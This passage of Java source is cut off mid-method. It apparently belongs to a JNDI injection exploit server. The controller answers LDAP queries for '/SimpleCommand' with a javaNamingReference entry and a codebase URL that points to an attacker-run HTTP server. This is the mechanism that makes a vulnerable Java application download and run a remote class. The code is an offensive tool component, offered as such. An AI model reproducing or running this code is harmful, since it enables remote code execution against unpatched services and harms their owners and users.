...
@LdapMapping(uri = "/SimpleCommand")
public class SimpleCommandController implements LdapController {

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        URL codeBase = new URL("http://0.0.0.0:"+ Config.httpPort +"/#SimpleCommand");
        Entry e = new Entry(base);
        e.addAttribute("objectClass", "javaNamingReference");
        e.addAttribute("javaClassName", "SimpleCommand");
